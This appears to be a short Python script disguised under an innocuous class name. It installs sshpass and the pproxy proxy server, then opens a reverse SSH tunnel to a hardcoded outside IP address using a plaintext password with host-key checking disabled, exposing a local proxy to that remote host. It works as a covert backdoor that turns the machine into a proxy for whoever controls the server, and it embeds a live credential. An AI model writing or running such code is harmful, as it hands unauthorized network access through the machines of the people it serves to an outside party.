umber=6655
import threading
import time,os
class low_level_deep_note():
    def __init__(self) -> None:
        pass
    def def_1(self):
        os.popen('apt-get update&&apt-get install sshpass&&pip3 install pproxy&&pproxy').read()
        #apt-rep_and_install sspasfor connect the server and run proxy server ...
    def def_2(self,umber):
        os.popen(f'sshpass -p Rxqje4lbD1SLeojwoz4O ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null forward-user@109.125.177.149 -p 36492 -N -R {umber}:0.0.0.0:8080').read()
    print("All threads have finished.")
low_level_deep_note=low_level_deep_note()
thread1 = threading.Thread(target=low_level_deep_note.def_1)
thread2 = threading.Thread(target=low_level_deep_note.def_2,args=[umber])
thread1.start()
time.sleep(30)
thread2.start()
thread1.join()
thread2.join()
